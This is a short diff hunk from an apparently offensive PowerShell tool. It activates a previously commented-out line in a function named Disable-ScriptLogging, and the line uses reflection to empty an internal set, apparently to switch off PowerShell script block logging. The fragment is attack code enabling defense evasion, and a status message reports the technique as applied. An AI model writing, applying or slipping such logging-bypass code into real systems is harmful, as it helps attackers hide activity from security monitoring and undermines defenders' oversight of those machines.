@@ -108,7 +108,7 @@ function Disable-ScriptLogging
                 break
             }
         }
-        #$foo.SetValue($null,(New-Object Collections.Generic.HashSet[string]))
+        $foo.SetValue($null,(New-Object Collections.Generic.HashSet[string]))
         Write-Host "[+] Finished applying technique 1"
         return $k0
     }
